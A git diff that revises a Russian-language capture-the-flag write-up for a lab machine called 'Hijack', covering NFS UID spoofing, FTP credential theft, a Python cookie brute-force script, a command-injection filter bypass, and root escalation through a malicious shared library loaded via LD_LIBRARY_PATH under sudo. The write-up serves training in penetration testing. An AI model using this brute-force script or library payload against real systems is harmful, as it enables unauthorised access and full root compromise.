@@ -1,10 +1,18 @@
-### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО
-- навык работы с nfs(и понимание его уязвимостей) и ftp
-- умение писать код для веб-автоматизации (в моем случае на питоне)
-- минимальные знания о принципе работы кук и механизме хэширования
-- понимание принципа работы переменных окружения, как можно их небезопасной настройкой воспользоваться и минимальное умение работать с си/динамическими библиотеками
+# Hijack
+
+### Необходимые навыки
+
+- Работа с NFS и FTP, понимание их типичных уязвимостей
+- Написание скриптов для веб-автоматизации (Python)
+- Базовое понимание механизмов cookie и хэширования (MD5, Base64)
+- Понимание переменных окружения и работы с динамическими библиотеками (C/gcc)
+
+---
+
 ### Доступ к системе
-1. По классике начинаем со скана портов
+
+Начнём с разведки — сканирование портов:
+
 ```
 sudo nmap -sV -sC 10.112.138.240
 [sudo] password for olya:
@@ -52,51 +60,50 @@ PORT     STATE SERVICE VERSION
 2049/tcp open  nfs     2-4 (RPC #100003)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-Посмотрим сайт на 80 порту. Сразу пофаззим директории, но ничего интересного найти не удалось
 
-<img width="761" height="622" alt="image" src="https://github.com/user-attachments/assets/d308331d-4fa5-430b-b7bd-b6b31ac3908d" />
+Осматриваем веб-сервис на 80 порту; параллельно запускаем фаззинг директорий — без результата.
 
-Сам сайт небольшой - стандартное поле ввода и админская панель, к которой доступа у нас нет(only the admin can access this page). 
-Прогнала через форму логина sqlmap, посмотрела запросы через бурп, быстро просмотрела код страничек - тоже ничего полезного.
+[![image](https://private-user-images.githubusercontent.com/260275793/583796947-d308331d-4fa5-430b-b7bd-b6b31ac3908d.png)](https://private-user-images.githubusercontent.com/260275793/583796947-d308331d-4fa5-430b-b7bd-b6b31ac3908d.png)
 
-<img width="761" height="193" alt="image" src="https://github.com/user-attachments/assets/852c4695-6bfa-4597-a369-c9eb8ff42e4c" />
+Сайт небольшой: стандартная форма входа и административная панель, доступ к которой ограничен (`only the admin can access this page`). Тестирование формы через sqlmap, анализ запросов в Burp Suite и просмотр исходного кода страниц не дали результата.
 
-Но у нас есть форма регистрации и понимание, что нам, вероятнее всего, нужно получить доступ к аккаунту админа. И вот мы проверяем форму регистрации
-и получаем приятный результат - слив информации о корректно подобранном юзернейме(username enumiration). Но брутфорсить не выйдет из-за ограничения
-на ввод пароля (5 попыток)
+[![image](https://private-user-images.githubusercontent.com/260275793/583797638-852c4695-6bfa-4597-a369-c9eb8ff42e4c.png)](https://private-user-images.githubusercontent.com/260275793/583797638-852c4695-6bfa-4597-a369-c9eb8ff42e4c.png)
 
-<img width="761" height="259" alt="image" src="https://github.com/user-attachments/assets/fd0132c8-ba96-44cb-abfc-f7e110d12672" />
+Форма регистрации раскрывает информацию о существующих именах пользователей (username enumeration). Однако брутфорс по форме входа недоступен — на ввод пароля установлен лимит в 5 попыток.
 
-Возвращаемся к открытым портам. Есть возможность посмотреть сетевую файловую систему (nfs), воспользуемся ей
+[![image](https://private-user-images.githubusercontent.com/260275793/583798541-fd0132c8-ba96-44cb-abfc-f7e110d12672.png)](https://private-user-images.githubusercontent.com/260275793/583798541-fd0132c8-ba96-44cb-abfc-f7e110d12672.png)
 
-``` Show mount -e 10.112.138.240 ```
+Возвращаемся к открытым портам. Обнаружен NFS — проверяем доступные шары:
 
-Там лежит /share/mount *. Монтируем к себе.
+`showmount -e 10.112.138.240`
 
-```sudo mount -t nfs 10.112.138.240:/var/share/mount /tmp/server_files```
+Доступна директория `/var/share/mount *`. Монтируем её локально:
 
-Открыть не удалось даже под рутом - включена защита nfs, а файл принадлежит юзеру с uid 1003. Попробуем создать такого же пользователя
+`sudo mount -t nfs 10.112.138.240:/var/share/mount /tmp/server_files`
 
-```sudo useradd -u 1003 test```
+Открыть директорию не удаётся даже от root — NFS применяет проверку по UID, и файлы принадлежат пользователю с UID 1003. Создаём локального пользователя с тем же UID:
 
-Открываем папку через этого юзера, и к счастью, никто на сервере в /etc/exports хотя бы all_squash не настроил - благодаря таким махинациям можем посмотреть содержимое папки. От пользователя test читаем содержимое папки и получаем креды от ftp. Логинимся
+`sudo useradd -u 1003 test`
 
-<img width="761" height="432" alt="image" src="https://github.com/user-attachments/assets/26d9f605-bae1-4c0b-861c-c9790cdbcf59" />
+Читаем содержимое шары от имени созданного пользователя. В `/etc/exports` не настроен `all_squash`, что позволяет такое сопоставление. Получаем учётные данные от FTP.
 
-Выгружаем все файлы к себе. И в итоге мы получили файл с 150 паролями и такое сообщение от админа
+[![image](https://private-user-images.githubusercontent.com/260275793/583802830-26d9f605-bae1-4c0b-861c-c9790cdbcf59.png)](https://private-user-images.githubusercontent.com/260275793/583802830-26d9f605-bae1-4c0b-861c-c9790cdbcf59.png)
 
-<img width="761" height="200" alt="image" src="https://github.com/user-attachments/assets/2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6" />
+Подключаемся по FTP и выгружаем все файлы. В архиве — список из 150 паролей и сообщение от администратора:
 
-Понимаем, что брутфорс нам недоступен. Я также попробовала xxe инъекцию из-за application/xml в content-type, но сервер все-таки фильтрует подобное. 
-Из-за этого я решила вернуться к созданному аккаунту на сайте, в котором по сути ничего и не было (машина простая, поэтому такой распорядок вещей вполне можно принимать за намек). И что у нас там есть? Конечно, куки. Попробуем посмотреть на них.
+[![image](https://private-user-images.githubusercontent.com/260275793/583803331-2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6.png)](https://private-user-images.githubusercontent.com/260275793/583803331-2bcd5238-283e-4e1d-aaaf-6ad618c6d2e6.png)
 
-<img width="287" height="255" alt="image" src="https://github.com/user-attachments/assets/8d4e4304-f812-46e8-bbd7-a784f0bbd5a3" />
+Брутфорс через форму входа по-прежнему недоступен. Проверка XXE-инъекции через `application/xml` в Content-Type — сервер фильтрует такие запросы.
 
-Можно предположить, что куки - закодированный в base64 юзернейм + хеш (походу MD5). Проверила - так и оказалось. 
+Возвращаемся к зарегистрированному аккаунту. На первый взгляд в нём ничего нет — однако это само по себе указывает на то, что вектор атаки проходит через сессионные данные. Анализируем cookie:
 
-Пишем код для брутфорса кук на питоне
+[![image](https://private-user-images.githubusercontent.com/260275793/583805506-8d4e4304-f812-46e8-bbd7-a784f0bbd5a3.png)](https://private-user-images.githubusercontent.com/260275793/583805506-8d4e4304-f812-46e8-bbd7-a784f0bbd5a3.png)
 
-```
+Cookie представляет собой Base64-закодированную строку вида `username:md5(password)`. Это открывает возможность для офлайн-брутфорса: вместо попыток входа через форму генерируем корректные cookie и отправляем их напрямую, обходя ограничение на количество попыток.
+
+Пишем скрипт на Python:
+
+```python
 import requests
 import base64
 import hashlib
@@ -188,7 +195,7 @@ def load_passwords(file_path):
         exit(1)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Гибкий брутфорс cookie для веб-приложения")
+    parser = argparse.ArgumentParser(description="Брутфорс cookie для веб-приложения")
     parser.add_argument("url", help="Целевой URL (например, http://10.112.138.240)")
     parser.add_argument("username", help="Имя пользователя")
     parser.add_argument("passfile", help="Файл со списком паролей (по одному на строку)")
@@ -217,33 +224,47 @@ if __name__ == "__main__":
         extra_headers=args.header
     )
 ```
-Запускаем: ```python script.py http://10.112.138.240 admin passwords.txt --fail "Welcome Guest"```
-Находим нужный пароль и заходим в админский аккаунт, получаем доступ к командной строке. Очевидно, что нужна command injection
 
-<img width="761" height="355" alt="image" src="https://github.com/user-attachments/assets/f8d80b59-d692-4e9d-8365-3a2272fbcba8" />
+Запускаем:
 
-Фильтр обходится через %0a. Далее опрокидываем себе реверс шелл и получаем шелл
+```
+python script.py http://10.112.138.240 admin passwords.txt --fail "Welcome Guest"
+```
 
-<img width="761" height="212" alt="image" src="https://github.com/user-attachments/assets/d1ef2d72-d692-4a90-a311-3890220a4000" />
+Пароль найден. Входим в административную панель — доступна командная строка, что явно указывает на возможность command injection.
 
+[![image](https://private-user-images.githubusercontent.com/260275793/583811474-f8d80b59-d692-4e9d-8365-3a2272fbcba8.png)](https://private-user-images.githubusercontent.com/260275793/583811474-f8d80b59-d692-4e9d-8365-3a2272fbcba8.png)
 
-<img width="761" height="51" alt="image" src="https://github.com/user-attachments/assets/ca340642-8216-450f-813c-1911b5c50c24" />
+Фильтр обходится через `%0a` (URL-encoded newline). Получаем reverse shell:
+
+[![image](https://private-user-images.githubusercontent.com/260275793/583813063-d1ef2d72-d692-4a90-a311-3890220a4000.png)](https://private-user-images.githubusercontent.com/260275793/583813063-d1ef2d72-d692-4a90-a311-3890220a4000.png)
+[![image](https://private-user-images.githubusercontent.com/260275793/583813077-ca340642-8216-450f-813c-1911b5c50c24.png)](https://private-user-images.githubusercontent.com/260275793/583813077-ca340642-8216-450f-813c-1911b5c50c24.png)
+
+---
 
 ### Взятие юзера
-Мы оказываемся в системе с правами пользователя wwww-data в каталоге с файлами типа config.php, где вполне могут быть оставлены креды. Читаем их - находим креды рика
-кстати, в пароле отсылка на рика эстли - удивительно, как создатели машин любят этот мем
 
-```su - rick``` 
+Оказываемся в системе с правами `www-data` в директории с файлами приложения. В `config.php` обнаруживаем учётные данные пользователя rick:
 
-Вводим пароль из файла, и вот мы вошли в систему под риком, где наконец можем прочитать флаг user.txt. 
+`su - rick`
+
+Вводим пароль из конфига и читаем `user.txt`.
+
+---
 
 ### Взятие рута
-машина, честно сказать, вышла муторная, поэтому как же я рада была увидеть это после ``` sudo -l ```. (господи, скажите, что на тачке есть компилятор)
 
-<img width="761" height="125" alt="image" src="https://github.com/user-attachments/assets/d13d4018-c57f-46a7-b4fd-c0b337eea362" />
+Проверяем sudo-права:
 
-мы можем указать путь к библиотеке, куда скрипт заглянет в первую очередь, и запускать апаче от судо - следовательно, нужно создать динамическую библиотеку с пэйлоадом и указать путь к ней через переменную окружения при запуске, чтобы этой дырой воспользоваться. создаем в /tmp library_path.c
-```
+`sudo -l`
+
+[![image](https://private-user-images.githubusercontent.com/260275793/583815090-d13d4018-c57f-46a7-b4fd-c0b337eea362.png)](https://private-user-images.githubusercontent.com/260275793/583815090-d13d4018-c57f-46a7-b4fd-c0b337eea362.png)
+
+Разрешено запускать Apache от имени root с передачей переменных окружения. Это открывает вектор через `LD_LIBRARY_PATH` — можно подменить динамическую библиотеку, которую загрузит процесс.
+
+Создаём вредоносную библиотеку в `/tmp`:
+
+```bash
 echo "#include <stdio.h>
 #include <stdlib.h>
 
@@ -253,16 +274,21 @@ void hijack() {
     unsetenv(\"LD_LIBRARY_PATH\");
     setresuid(0,0,0);
     system(\"/bin/bash -p\");
-}" > library_path.c
+}" > /tmp/library_path.c
 ```
-компилируем в динамическую библиотеку
-```
+
+Компилируем как разделяемую библиотеку:
+
+```bash
 gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/library_path.c
 ```
-далее запускаем процесс, установив нужный нам путь до библиотеки с пэйлоадом
-```
+
+Запускаем Apache с указанием пути к нашей библиотеке:
+
+```bash
 sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
 ```
-и радуемся - мы есть рут
 
-<img width="761" height="250" alt="image" src="https://github.com/user-attachments/assets/3c0ae962-7f26-4b15-858b-3b81bf748542" />
+Root-доступ получен.
+
+[![image](https://private-user-images.githubusercontent.com/260275793/583871307-3c0ae962-7f26-4b15-858b-3b81bf748542.png)](https://private-user-images.githubusercontent.com/260275793/583871307-3c0ae962-7f26-4b15-858b-3b81bf748542.png)
